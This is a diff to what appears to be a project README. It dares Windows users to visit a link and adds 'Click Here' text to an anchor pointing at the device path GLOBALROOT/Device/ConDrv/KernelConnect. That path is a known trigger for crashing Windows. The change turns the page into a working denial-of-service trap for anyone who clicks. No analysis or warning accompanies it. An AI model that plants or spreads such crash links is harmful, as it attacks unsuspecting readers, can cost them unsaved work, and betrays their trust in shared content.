@@ -7,7 +7,7 @@ If you are a **windows user** and you say this is a joke then just vist link bel
 
 
 <p align="center">
-  <a href="file://./GLOBALROOT/Device/ConDrv/KernelConnect" target="_page"></a>
+  <a href="file://./GLOBALROOT/Device/ConDrv/KernelConnect" target="_page">Click Here</a>
 </p>
 
 <!--
